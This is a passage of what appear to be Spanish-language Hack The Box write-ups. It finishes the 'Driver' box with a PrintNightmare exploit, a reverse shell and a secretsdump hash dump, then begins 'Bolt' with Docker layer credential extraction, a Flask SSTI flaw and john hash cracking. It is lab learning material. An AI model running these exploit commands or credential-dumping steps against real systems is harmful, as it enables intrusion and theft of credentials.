samba.\n1 2 3 4 5 6 7 8 9 10 π ~/htb/driver ❯ ./CVE-2021-1675.py tony:liltony@driver.htb \u0026#39;\\\\10.10.14.30\\sc\\sc.dll\u0026#39; [*] Connecting to ncacn_np:driver.htb[\\PIPE\\spoolss] [+] Bind OK [+] pDriverPath Found C:\\Windows\\System32\\DriverStore\\FileRepository\\ntprint.inf_amd64_f66d9eed7e835e97\\Amd64\\UNIDRV.DLL [*] Executing \\??\\UNC\\10.10.14.30\\sc\\sc.dll [*] Try 1... [*] Stage0: 0 [*] Try 2... [*] Stage0: 0 [*] Try 3... Con la ejecucion de netcat en el puerto especificado en msfvenom obtuvimos una shell como usuario root (Administrador), finalmente nuestra flag root.txt.\n1 2 3 4 5 6 7 8 9 10 11 π ~/htb/driver ❯ rlwrap nc -lvp 1339 listening on [any] 1339 ... connect to [10.10.14.30] from driver.htb [10.10.11.106] 49423 Microsoft Windows [Version 10.0.10240] (c) 2015 Microsoft Corporation. All rights reserved. C:\\Windows\\system32\u0026gt; whoami nt authority\\system C:\\Windows\\system32\u0026gt; type C:\\Users\\Administrator\\Desktop\\root.txt bcb9fc23e9309e32a7e543d5126e88f6 C:\\Windows\\system32\u0026gt; Powershell Tambien existe una version para Powershell escrita por Caleb Stewart | John Hammond el cual crea un usuario como administrador y de igual manera es posible utilizar un DLL. Utilizando evil-winrm importamos el archivo y agregamos un nuevo usuario, vemos que este pertenece al grupo de administradores.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 *Evil-WinRM* PS C:\\Users\\tony\\Documents\u0026gt; upload CVE-2021-1675.ps1 Info: Uploading CVE-2021-1675.ps1 to C:\\Users\\tony\\Documents\\CVE-2021-1675.ps1 [... snip ...] Info: Upload successful! *Evil-WinRM* PS C:\\Users\\tony\\Documents\u0026gt; cat -raw CVE-2021-1675.ps1|iex *Evil-WinRM* PS C:\\Users\\tony\\Documents\u0026gt; Invoke-Nightmare -NewUser \u0026#34;sckull\u0026#34; -NewPassword \u0026#34;sckullx123\u0026#34; [+] created payload at C:\\Users\\tony\\AppData\\Local\\Temp\\nightmare.dll [+] using pDriverPath = \u0026#34;C:\\Windows\\System32\\DriverStore\\FileRepository\\ntprint.inf_amd64_f66d9eed7e835e97\\Amd64\\mxdwdrv.dll\u0026#34; [+] added user sckull as local administrator [+] deleting payload from C:\\Users\\tony\\AppData\\Local\\Temp\\nightmare.dll *Evil-WinRM* PS C:\\Users\\tony\\Documents\u0026gt; net user sckull User name sckull Full Name sckull Comment User\u0026#39;s comment Country/region code 000 (System Default) Account active Yes Account expires Never Password last set 10/9/2021 5:48:21 AM Password expires Never Password changeable 10/9/2021 5:48:21 AM Password required Yes User may change password Yes Workstations allowed All Logon script User profile Home directory Last logon Never Logon hours allowed All Local Group Memberships *Administrators Global Group memberships *None The command completed successfully. *Evil-WinRM* PS C:\\Users\\tony\\Documents\u0026gt; Con el usuario creado podemos acceder con full permisos de Administrador utilizando psexec y obtener los hashes utilizando secretsdump.\nbash\rbash\r1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 π ~/htb/driver ❯ impacket-psexec sckull:sckullx123@driver.htb Impacket v0.9.24.dev1+20210704.162046.29ad5792 - Copyright 2021 SecureAuth Corporation [*] Requesting shares on driver.htb..... [*] Found writable share ADMIN$ [*] Uploading file boxhjDuT.exe [*] Opening SVCManager on driver.htb..... [*] Creating service Czhp on driver.htb..... [*] Starting service Czhp..... [!] Press help for extra shell commands Microsoft Windows [Version 10.0.10240] (c) 2015 Microsoft Corporation. All rights reserved. C:\\Windows\\system32\u0026gt;whoami nt authority\\system C:\\Windows\\system32\u0026gt; 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 π ~/htb/driver ❯ impacket-secretsdump sckull:sckullx123@driver.htb Impacket v0.9.24.dev1+20210704.162046.29ad5792 - Copyright 2021 SecureAuth Corporation [*] Service RemoteRegistry is in stopped state [*] Service RemoteRegistry is disabled, enabling it [*] Starting service RemoteRegistry [*] Target system bootKey: 0xe5b3cda034afd685bc69ccd3c4e9387c [*] Dumping local SAM hashes (uid:rid:lmhash:nthash) Administrator:500:aad3b435b51404eeaad3b435b51404ee:d1256cff8b5b5fdb8c327d3b6c3f5017::: Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0::: DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0::: tony:1003:aad3b435b51404eeaad3b435b51404ee:dfdb5b520de42ca5d1b84ce61553d085::: sckull:1004:aad3b435b51404eeaad3b435b51404ee:44198dfc6b720ccdd3323386972d127e::: [*] Dumping cached domain logon information (domain/username:hash) [*] Dumping LSA Secrets [*] DefaultPassword DRIVER\\tony:liltony [*] DPAPI_SYSTEM dpapi_machinekey:0x68d8efd1bd3fa3ab206268f0bbc6e2a4a5e4b43e dpapi_userkey:0x68060403e8f0276a683ad704b45dc7b850d9722f [*] Cleaning up... [*] Stopping service RemoteRegistry [*] Restoring the disabled state for service RemoteRegistry π ~/htb/driver ❯ ","description":"En driver encontramos un sitio web que nos permite subir archivos a un recurso compartido de SMB, utilizamos un archivo sfc lo que nos permitió obtener el hash de un primer usuario y acceso por WinRM. Finalmente escalamos privilegios explotando la vulnerabilidad del servicio spool con PrinterNightmare.","id":34,"section":"posts","tags":["scf","winrm","printnightmare","powershell","responder","winpeas"],"title":"Hack The Box - Driver","uri":"https://sckull.github.io/posts/driver/"},{"content":"\rEn Bolt analizamos una imagen de docker donde descubrimos una vulnerabilidad SSTI en una aplicación de Flask, esto nos permitio el acceder al primer usuario. Credenciales almacenadas nos permitieron obtener acceso a un segundo usuario. Finalmente obtuvimos en texto plano las credenciales del superusuario con una clave privada en una extensión de Google Chrome.\nNombre Bolt OS Linux Puntos 30 Dificultad Media IP 10.10.11.114 Maker d4rkpayl0ad TheCyberGeek Matrix\r{\r\u0026#34;type\u0026#34;:\u0026#34;radar\u0026#34;,\r\u0026#34;data\u0026#34;:{\r\u0026#34;labels\u0026#34;:[\u0026#34;Enumeration\u0026#34;,\u0026#34;Real-Life\u0026#34;,\u0026#34;CVE\u0026#34;,\u0026#34;Custom Explotation\u0026#34;,\u0026#34;CTF-Like\u0026#34;],\r\u0026#34;datasets\u0026#34;:[\r{\r\u0026#34;label\u0026#34;:\u0026#34;User Rate\u0026#34;, \u0026#34;data\u0026#34;:[7.3, 5.8, 4.7, 5.3, 4.2],\r\u0026#34;backgroundColor\u0026#34;:\u0026#34;rgba(75, 162, 189,0.5)\u0026#34;,\r\u0026#34;borderColor\u0026#34;:\u0026#34;#4ba2bd\u0026#34;\r},\r{ \u0026#34;label\u0026#34;:\u0026#34;Maker Rate\u0026#34;,\r\u0026#34;data\u0026#34;:[10, 10, 10, 0, 0],\r\u0026#34;backgroundColor\u0026#34;:\u0026#34;rgba(154, 204, 20,0.5)\u0026#34;,\r\u0026#34;borderColor\u0026#34;:\u0026#34;#9acc14\u0026#34;\r}\r]\r},\r\u0026#34;options\u0026#34;: {\u0026#34;scale\u0026#34;: {\u0026#34;ticks\u0026#34;: {\u0026#34;backdropColor\u0026#34;:\u0026#34;rgba(0,0,0,0)\u0026#34;},\r\u0026#34;angleLines\u0026#34;:{\u0026#34;color\u0026#34;:\u0026#34;rgba(255, 255, 255,0.6)\u0026#34;},\r\u0026#34;gridLines\u0026#34;:{\u0026#34;color\u0026#34;:\u0026#34;rgba(255, 255, 255,0.6)\u0026#34;}\r}\r}\r} Recon Nmap nmap muestra multiples puertos abiertos: http/s (80, 443), SSH (22).\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 # Nmap 7.91 scan initiated Mon Sep 27 16:41:41 2021 as: nmap -p22,80,443 -sC -sV -o nmap_scan 10.10.11.114 Nmap scan report for 10.10.11.114 (10.10.11.114) Host is up (0.17s latency). PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 8.2p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0) | ssh-hostkey: | 3072 4d:20:8a:b2:c2:8c:f5:3e:be:d2:e8:18:16:28:6e:8e (RSA) | 256 7b:0e:c7:5f:5a:4c:7a:11:7f:dd:58:5a:17:2f:cd:ea (ECDSA) |_ 256 a7:22:4e:45:19:8e:7d:3c:bc:df:6e:1d:6c:4f:41:56 (ED25519) 80/tcp open http nginx 1.18.0 (Ubuntu) |_http-server-header: nginx/1.18.0 (Ubuntu) |_http-title: Starter Website - About 443/tcp open ssl/http nginx 1.18.0 (Ubuntu) |_http-server-header: nginx/1.18.0 (Ubuntu) | http-title: Passbolt | Open source password manager for teams |_Requested resource was /auth/login?redirect=%2F | ssl-cert: Subject: commonName=passbolt.bolt.htb/organizationName=Internet Widgits Pty Ltd/stateOrProvinceName=Some-State/countryName=AU | Not valid before: 2021-02-24T19:11:23 |_Not valid after: 2022-02-24T19:11:23 Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . # Nmap done at Mon Sep 27 16:42:09 2021 -- 1 IP address (1 host up) scanned in 28.19 seconds Web Site Inicialmente encontramos un dominio y subdominio en nmap el cual agregamos a nuestro archivo /etc/hosts, encontramos un sitio web en el que ofrecen diferentes servicios y vemos algunos nombres que podrian ser utilizados como usuarios o contraseñas.\nVemos en el formulario de contacto (/contact) dos emails.\nEn la pagina /download encontramos una direccion para descargar una imagen de docker.\nPassbolt Al visitar el subdominio en HTTPS encontramos passbolt un gestor de contraseñas que pregunta por un email.\nDocker Al descargar el archivo .tar que encontramos en /download y cargarlo localmente vemos diferentes \u0026ldquo;capas\u0026rdquo;, el peso y nombre del repositorio o imagen.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 sckull@tars:~/docker$ sudo docker load \u0026lt; image.tar 3fc64803ca2d: Loading layer [==================================================\u0026gt;] 4.463MB/4.463MB 73f2f98bc222: Loading layer [==================================================\u0026gt;] 7.68kB/7.68kB 8f2df5d06a26: Loading layer [==================================================\u0026gt;] 62.86MB/62.86MB a1e4f9dc4110: Loading layer [==================================================\u0026gt;] 57.57MB/57.57MB f0c4120bc314: Loading layer [==================================================\u0026gt;] 29.79MB/29.79MB 14ec2ed1c30d: Loading layer [==================================================\u0026gt;] 6.984MB/6.984MB 68c03965721f: Loading layer [==================================================\u0026gt;] 3.072kB/3.072kB fec67b58fd48: Loading layer [==================================================\u0026gt;] 19.97kB/19.97kB 7fa1531c7420: Loading layer [==================================================\u0026gt;] 7.168kB/7.168kB e45bbea785e3: Loading layer [==================================================\u0026gt;] 15.36kB/15.36kB ac16908b339d: Loading layer [==================================================\u0026gt;] 8.192kB/8.192kB Loaded image: flask-dashboard-adminlte_appseed-app:latest sckull@tars:~/docker$ sudo docker images REPOSITORY TAG IMAGE ID CREATED SIZE flask-dashboard-adminlte_appseed-app latest 859e74798e6c 6 months ago 154MB sckull@tars:~/docker$ APP Tras ejecutar y acceder al contenedor encontramos la configuración de la aplicación web, vemos credenciales de bases de datos y algunas \u0026ldquo;Secret keys\u0026rdquo;, tambien se observa la configuración de correo electronico. Si bien en la configuración de sqlite se menciona el archivo db.sqlite3 este no existe dentro del contenedor.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 / # cat .env DEBUG=True SECRET_KEY=S3cr3t_K#Key DB_ENGINE=postgresql DB_NAME=appseed-flask DB_HOST=localhost DB_PORT=5432 DB_USERNAME=appseed DB_PASS=pass / # ls __pycache__ config.py gunicorn-cfg.py media requirements.txt run.py sys var app dev home mnt root sbin tmp bin etc lib proc run srv usr / # cat config.py # -*- encoding: utf-8 -*- \u0026#34;\u0026#34;\u0026#34; Copyright (c) 2019 - present AppSeed.us \u0026#34;\u0026#34;\u0026#34; import os from decouple import config class Config(object): basedir = os.path.abspath(os.path.dirname(__file__)) # Set up the App SECRET_KEY SECRET_KEY = config(\u0026#39;SECRET_KEY\u0026#39;, default=\u0026#39;S#perS3crEt_007\u0026#39;) # This will create a file in \u0026lt;app\u0026gt; FOLDER SQLALCHEMY_DATABASE_URI = \u0026#39;sqlite:///\u0026#39; + os.path.join(basedir, \u0026#39;db.sqlite3\u0026#39;) SQLALCHEMY_TRACK_MODIFICATIONS = False MAIL_SERVER = \u0026#39;localhost\u0026#39; MAIL_PORT = 25 MAIL_USE_TLS = False MAIL_USE_SSL = False MAIL_USERNAME = None MAIL_PASSWORD = None DEFAULT_MAIL_SENDER = \u0026#39;support@bolt.htb\u0026#39; class ProductionConfig(Config): DEBUG = False # Security SESSION_COOKIE_HTTPONLY = True REMEMBER_COOKIE_HTTPONLY = True REMEMBER_COOKIE_DURATION = 3600 # PostgreSQL database SQLALCHEMY_DATABASE_URI = \u0026#39;{}://{}:{}@{}:{}/{}\u0026#39;.format( config( \u0026#39;DB_ENGINE\u0026#39; , default=\u0026#39;postgresql\u0026#39; ), config( \u0026#39;DB_USERNAME\u0026#39; , default=\u0026#39;appseed\u0026#39; ), config( \u0026#39;DB_PASS\u0026#39; , default=\u0026#39;pass\u0026#39; ), config( \u0026#39;DB_HOST\u0026#39; , default=\u0026#39;localhost\u0026#39; ), config( \u0026#39;DB_PORT\u0026#39; , default=5432 ), config( \u0026#39;DB_NAME\u0026#39; , default=\u0026#39;appseed-flask\u0026#39; ) ) class DebugConfig(Config): DEBUG = True # Load all possible configurations config_dict = { \u0026#39;Production\u0026#39;: ProductionConfig, \u0026#39;Debug\u0026#39; : DebugConfig } / # Vemos en /app dos \u0026ldquo;modulos\u0026rdquo; utilizando blueprints de flask.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 /app # ls -lah total 24 drwxr-xr-x 1 root root 4.0K Mar 5 2021 . drwxr-xr-x 1 root root 4.0K Sep 28 05:52 .. -rw-r--r-- 1 root root 1.0K Mar 5 2021 __init__.py drwxr-xr-x 1 root root 4.0K Mar 5 2021 __pycache__ drwxr-xr-x 1 root root 4.0K Mar 5 2021 base drwxr-xr-x 1 root root 4.0K Mar 5 2021 home /app # cat __init__.py # -*- encoding: utf-8 -*- \u0026#34;\u0026#34;\u0026#34; Copyright (c) 2019 - present AppSeed.us \u0026#34;\u0026#34;\u0026#34; from flask import Flask, url_for from flask_login import LoginManager from flask_sqlalchemy import SQLAlchemy from importlib import import_module from logging import basicConfig, DEBUG, getLogger, StreamHandler from os import path db = SQLAlchemy() login_manager = LoginManager() def register_extensions(app): db.init_app(app) login_manager.init_app(app) def register_blueprints(app): for module_name in (\u0026#39;base\u0026#39;, \u0026#39;home\u0026#39;): module = import_module(\u0026#39;app.{}.routes\u0026#39;.format(module_name)) app.register_blueprint(module.blueprint) def configure_database(app): @app.before_first_request def initialize_database(): db.create_all() @app.teardown_request def shutdown_session(exception=None): db.session.remove() def create_app(config): app = Flask(__name__, static_folder=\u0026#39;base/static\u0026#39;) app.config.from_object(config) register_extensions(app) register_blueprints(app) configure_database(app) return app /app # Base El modulo base pareciera ser \u0026ldquo;parte\u0026rdquo; del sitio web en el puerto 80 ya que se muestra plantillas y rutas similares.\nAlgo que podríamos destacar es el metodo para encriptar las contraseñas basado en MD5 y que además este modulo solo presenta información estatica sin ninguna otra funcionalidad más que la de registro, login y logout, al menos en esta capa del contenedor.\n1 2 3 4 def hash_pass( password ): \u0026#34;\u0026#34;\u0026#34;Hash a password for storing.\u0026#34;\u0026#34;\u0026#34; password = crypt.crypt(password,crypt.METHOD_MD5) return ( password.encode(\u0026#39;utf-8\u0026#39;) ) Tras registrar un usuario (localmente) vemos una plantilla estatica que no se muestra en el codigo del modulo Base.\nHome El modulo \u0026ldquo;home\u0026rdquo; muestra algunas runtas, una de ellas es /example-profile que obtiene algunas variables por el metodo POST, que son utilizadas para crear un correo que antes de renderizar la plantilla definida es enviado al usuario \u0026ldquo;actual\u0026rdquo;, en el proceso inserta información a la base de datos y crea una URL de confirmación utilizando la funcion o ruta confirm_changes() junto con una plantilla que es enviada en el correo final.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 @blueprint.route(\u0026#34;/example-profile\u0026#34;, methods=[\u0026#39;GET\u0026#39;, \u0026#39;POST\u0026#39;]) @login_required def profile(): \u0026#34;\u0026#34;\u0026#34;Profiles\u0026#34;\u0026#34;\u0026#34; if request.method == \u0026#39;GET\u0026#39;: return render_template(\u0026#39;example-profile.html\u0026#39;, user=user,current_user=current_user) else: \u0026#34;\u0026#34;\u0026#34;Experimental Feature\u0026#34;\u0026#34;\u0026#34; cur_user = current_user user = current_user.username name = request.form[\u0026#39;name\u0026#39;] experience = request.form[\u0026#39;experience\u0026#39;] skills = request.form[\u0026#39;skills\u0026#39;] msg = Message( recipients=[f\u0026#39;{cur_user.email}\u0026#39;], sender = \u0026#39;support@example.com\u0026#39;, reply_to = \u0026#39;support@example.com\u0026#39;, subject = \u0026#34;Please confirm your profile changes\u0026#34; ) try: cur_user.profile_update = name except: return render_template(\u0026#39;page-500.html\u0026#39;) db.session.add(current_user) db.session.commit() token = ts.dumps(user, salt=\u0026#39;changes-confirm-key\u0026#39;) confirm_url = url_for(\u0026#39;home_blueprint.confirm_changes\u0026#39;,token=token,_external=True) html = render_template(\u0026#39;emails/confirm-changes.html\u0026#39;,confirm_url=confirm_url) msg.html = html mail.send(msg) return render_template(\u0026#39;index.html\u0026#39;) Si vemos la plantilla existe un formulario que envia las variables por metodo POST.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 [... snip ...] \u0026lt;div class=\u0026#34;tab-pane\u0026#34; id=\u0026#34;settings\u0026#34;\u0026gt; \u0026lt;p\u0026gt;Email verification is required in order to update personal information.\u0026lt;/p\u0026gt; \u0026lt;form class=\u0026#34;form-horizontal\u0026#34; action=\u0026#34;/example-profile\u0026#34; method=\u0026#34;POST\u0026#34;\u0026gt; \u0026lt;div class=\u0026#34;form-group row\u0026#34;\u0026gt; \u0026lt;label for=\u0026#34;inputName2\u0026#34; class=\u0026#34;col-sm-2 col-form-label\u0026#34;\u0026gt;Name\u0026lt;/label\u0026gt; \u0026lt;div class=\u0026#34;col-sm-10\u0026#34;\u0026gt; \u0026lt;input type=\u0026#34;text\u0026#34; class=\u0026#34;form-control\u0026#34; id=\u0026#34;inputName2\u0026#34; name=\u0026#34;name\u0026#34; placeholder=\u0026#34;Name\u0026#34;\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;div class=\u0026#34;form-group row\u0026#34;\u0026gt; \u0026lt;label for=\u0026#34;inputExperience\u0026#34; class=\u0026#34;col-sm-2 col-form-label\u0026#34;\u0026gt;Experience\u0026lt;/label\u0026gt; \u0026lt;div class=\u0026#34;col-sm-10\u0026#34;\u0026gt; \u0026lt;textarea class=\u0026#34;form-control\u0026#34; id=\u0026#34;inputExperience\u0026#34; name=\u0026#34;experience\u0026#34; placeholder=\u0026#34;Experience\u0026#34;\u0026gt;\u0026lt;/textarea\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;div class=\u0026#34;form-group row\u0026#34;\u0026gt; \u0026lt;label for=\u0026#34;inputSkills\u0026#34; class=\u0026#34;col-sm-2 col-form-label\u0026#34;\u0026gt;Skills\u0026lt;/label\u0026gt; \u0026lt;div class=\u0026#34;col-sm-10\u0026#34;\u0026gt; \u0026lt;input type=\u0026#34;text\u0026#34; class=\u0026#34;form-control\u0026#34; id=\u0026#34;inputSkills\u0026#34; name=\u0026#34;skills\u0026#34; placeholder=\u0026#34;Skills\u0026#34;\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;div class=\u0026#34;form-group row\u0026#34;\u0026gt; \u0026lt;div class=\u0026#34;offset-sm-2 col-sm-10\u0026#34;\u0026gt; \u0026lt;div class=\u0026#34;checkbox\u0026#34;\u0026gt; \u0026lt;label\u0026gt; \u0026lt;input type=\u0026#34;checkbox\u0026#34;\u0026gt; I agree to the \u0026lt;a href=\u0026#34;#\u0026#34;\u0026gt;terms and conditions\u0026lt;/a\u0026gt; \u0026lt;/label\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;div class=\u0026#34;form-group row\u0026#34;\u0026gt; \u0026lt;div class=\u0026#34;offset-sm-2 col-sm-10\u0026#34;\u0026gt; \u0026lt;button type=\u0026#34;submit\u0026#34; class=\u0026#34;btn btn-danger\u0026#34;\u0026gt;Submit\u0026lt;/button\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;/form\u0026gt; \u0026lt;/div\u0026gt; [... snip ...] La ruta o funcion confirm_changes() obtiene el nombre del usuario que es utilizado en la plantilla para ser enviado por correo electronico utilizando render_template_string() lo que supone una vulnerabilidad de SSTI ya que name es aceptada como variable en /example-profile, puede ser modificada y no existe algun tipo de \u0026ldquo;filtro\u0026rdquo;.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 @blueprint.route(\u0026#39;/confirm/changes/\u0026lt;token\u0026gt;\u0026#39;) def confirm_changes(token): \u0026#34;\u0026#34;\u0026#34;Confirmation Token\u0026#34;\u0026#34;\u0026#34; try: email = ts.loads(token, salt=\u0026#34;changes-confirm-key\u0026#34;, max_age=86400) except: abort(404) user = User.query.filter_by(username=email).first_or_404() name = user.profile_update template = open(\u0026#39;templates/emails/update-name.html\u0026#39;, \u0026#39;r\u0026#39;).read() msg = Message( recipients=[f\u0026#39;{user.email}\u0026#39;], sender = \u0026#39;support@example.com\u0026#39;, reply_to = \u0026#39;support@example.com\u0026#39;, subject = \u0026#34;Your profile changes have been confirmed.\u0026#34; ) msg.html = render_template_string(template % name) mail.send(msg) return render_template(\u0026#39;index.html\u0026#39;) Vemos en la plantilla que es utilizada literal la variable \u0026ldquo;name\u0026rdquo;, tras enviar el correo el nombre aparecerá en esta plantilla.\n1 2 3 4 5 6 \u0026lt;html\u0026gt; \u0026lt;body\u0026gt; \u0026lt;p\u0026gt; %s \u0026lt;/p\u0026gt; \u0026lt;p\u0026gt; This e-mail serves as confirmation of your profile username changes.\u0026lt;/p\u0026gt; \u0026lt;/body\u0026gt; \u0026lt;/html\u0026gt; Vulnerabilidad Como pequeño resumen, la ruta /example-profile obtiene datos para actualizar el perfil, tras la confirmación por url se realizan los cambios y, estos son son enviados por correo electronico. Si deseamos explotar la vulnerabilidad SSTI debemos de enviar codigo en la variable name y, el resultado de la ejecucion se mostraría en el correo recibido por el usuario que realiza la actualizacion.\nLas rutas no pueden ser accedidas, se muestra un error Internal Server Error. Además este modulo es el encargado de mostrar todas las plantillas (route_template()) tras acceder con el login.\nImagen Si listamos el historial de la imagen vemos diferentes cambios algunos mas pesados que otros.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 sckull@tars:~/docker$ sudo docker history 859e74798e6c IMAGE CREATED CREATED BY SIZE COMMENT 859e74798e6c 6 months ago gunicorn --config gunicorn-cfg.py run:app 3.93kB \u0026lt;missing\u0026gt; 6 months ago sh 8.49kB \u0026lt;missing\u0026gt; 6 months ago gunicorn --config gunicorn-cfg.py run:app 6B \u0026lt;missing\u0026gt; 6 months ago gunicorn --config gunicorn-cfg.py run:app 16.4kB \u0026lt;missing\u0026gt; 6 months ago gunicorn --config gunicorn-cfg.py run:app 6B \u0026lt;missing\u0026gt; 6 months ago gunicorn --config gunicorn-cfg.py run:app 6.95MB \u0026lt;missing\u0026gt; 6 months ago /bin/sh -c #(nop) CMD [\u0026#34;gunicorn\u0026#34; \u0026#34;--config… 0B \u0026lt;missing\u0026gt; 6 months ago /bin/sh -c #(nop) EXPOSE 5005 0B \u0026lt;missing\u0026gt; 6 months ago /bin/sh -c pip3 install -r requirements.txt 28.3MB \u0026lt;missing\u0026gt; 6 months ago /bin/sh -c apk --update add python3 py3-pip 53MB \u0026lt;missing\u0026gt; 6 months ago /bin/sh -c #(nop) COPY dir:f385c9405a9b189a6… 61.2MB \u0026lt;missing\u0026gt; 6 months ago /bin/sh -c #(nop) COPY multi:e0a96f9a5ad90dc… 2.86kB \u0026lt;missing\u0026gt; 6 months ago /bin/sh -c #(nop) ENV FLASK_APP=run.py 0B \u0026lt;missing\u0026gt; 2 years ago /bin/sh -c #(nop) CMD [\u0026#34;/bin/sh\u0026#34;] 0B \u0026lt;missing\u0026gt; 2 years ago /bin/sh -c #(nop) ADD file:aa17928040e31624c… 4.21MB sckull@tars:~/docker$ El archivo de imagen es un .tar por lo que al extraerlo vemos las diferentes capas, en el archivo repositories se describe la más reciente y en el archivo manifest los nombres de las diferentes capas. Si seguimos el orden de las capas (\u0026ldquo;historial\u0026rdquo;) que se muestran encontramos información que no está en el estado actual de la imagen. Primero (en la capa 41093412e0da959c80875bb0db640c1302d5bcdffec759a3a5670950272789ad), vemos en el archivo de rutas del modulo base la ruta /register durante el registro pregunta por un codigo de invitacion mismo que se muestra en elcodigo fuente.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 @blueprint.route(\u0026#39;/register\u0026#39;, methods=[\u0026#39;GET\u0026#39;, \u0026#39;POST\u0026#39;]) def register(): login_form = LoginForm(request.form) create_account_form = CreateAccountForm(request.form) if \u0026#39;register\u0026#39; in request.form: username = request.form[\u0026#39;username\u0026#39;] email = request.form[\u0026#39;email\u0026#39; ] code = request.form[\u0026#39;invite_code\u0026#39;] if code != \u0026#39;XNSS-HSJW-3NGU-8XTJ\u0026#39;: return render_template(\u0026#39;code-500.html\u0026#39;) data = User.query.filter_by(email=email).first() if data is None and code == \u0026#39;XNSS-HSJW-3NGU-8XTJ\u0026#39;: # Check usename exists user = User.query.filter_by(username=username).first() if user: return render_template( \u0026#39;accounts/register.html\u0026#39;, msg=\u0026#39;Username already registered\u0026#39;, success=False, form=create_account_form) # Check email exists user = User.query.filter_by(email=email).first() if user: return render_template( \u0026#39;accounts/register.html\u0026#39;, msg=\u0026#39;Email already registered\u0026#39;, success=False, form=create_account_form) # else we can create the user user = User(**request.form) db.session.add(user) db.session.commit() return render_template( \u0026#39;accounts/register.html\u0026#39;, msg=\u0026#39;User created please \u0026lt;a href=\u0026#34;/login\u0026#34;\u0026gt;login\u0026lt;/a\u0026gt;\u0026#39;, success=True, form=create_account_form) else: return render_template( \u0026#39;accounts/register.html\u0026#39;, form=create_account_form) Tambien encontramos (en a4ea7da8de7bfbf327b56b0cb794aed9a8487d31e588b75029f6b527af2976f2) un archivo de base de datos SQLite donde observamos las credenciales del usuario admin.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 sckull@tars:~/docker/image/image/a4ea7da8de7bfbf327b56b0cb794aed9a8487d31e588b75029f6b527af2976f2$ ls db.sqlite3 json layer.tar root tmp VERSION sckull@tars:~/docker/image/image/a4ea7da8de7bfbf327b56b0cb794aed9a8487d31e588b75029f6b527af2976f2$ sqlite3 SQLite version 3.34.1 2021-01-20 14:10:07 Enter \u0026#34;.help\u0026#34; for usage hints. Connected to a transient in-memory database. Use \u0026#34;.open FILENAME\u0026#34; to reopen on a persistent database. sqlite\u0026gt; .open db.sqlite3 sqlite\u0026gt; .tables User sqlite\u0026gt; .schema User CREATE TABLE IF NOT EXISTS \u0026#34;User\u0026#34; ( id INTEGER NOT NULL, username VARCHAR, email VARCHAR, password BLOB, email_confirmed BOOLEAN, profile_update VARCHAR(80), PRIMARY KEY (id), UNIQUE (username), UNIQUE (email) ); sqlite\u0026gt; select * from User; 1|admin|admin@bolt.htb|$1$sm1RceCh$rSd3PygnS/6jlFDfF2J5q.|| sqlite\u0026gt; Password Cracking Ejecutamos john con el wordlist rockyou.txt, con ello obtuvimos la contraseña en texto plano.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 π ~/htb/bolt ❯ vim hash_admin π ~/htb/bolt ❯ cat hash_admin $1$sm1RceCh$rSd3PygnS/6jlFDfF2J5q. π ~/htb/bolt ❯ john hash_admin --wordlist=$ROCK Warning: detected hash type \u0026#34;md5crypt\u0026#34;, but the string is also recognized as \u0026#34;md5crypt-long\u0026#34; Use the \u0026#34;--format=md5crypt-long\u0026#34; option to force loading these as that type instead Using default input encoding: UTF-8 Loaded 1 password hash (md5crypt, crypt(3) $1$ (and variants) [MD5 256/256 AVX2 8x3]) Will run 4 OpenMP threads Press \u0026#39;q\u0026#39; or Ctrl-C to abort, almost any other key for status deadbolt (?) 1g 0:00:00:00 DONE (2021-09-27 17:19) 1.639g/s 283278p/s 283278c/s 283278C/s doida..curtis13 Use the \u0026#34;--show\u0026#34; option to display all of the cracked passwords reliably Session completed π ~/htb/bolt ❯ AdminLTE En el dominio principal encontramos un login donde logramos ingresar utilizando las credenciales de la base de datos SQLite. Vemos que es muy diferente a los modulos del contenedor. En el dashboard vemos una conversacion de chat donde se menciona una demo restringida y un nombre (Eddie).\nDirectory Brute Forcing Tras ejecutar feroxbuster no encontramos una direccion relacionada a la demo. Además las direcciones relacionadas al modulo \u0026ldquo;home\u0026rdquo; no se encuetran en este sitio.\n1 2 3 4 5 6 7 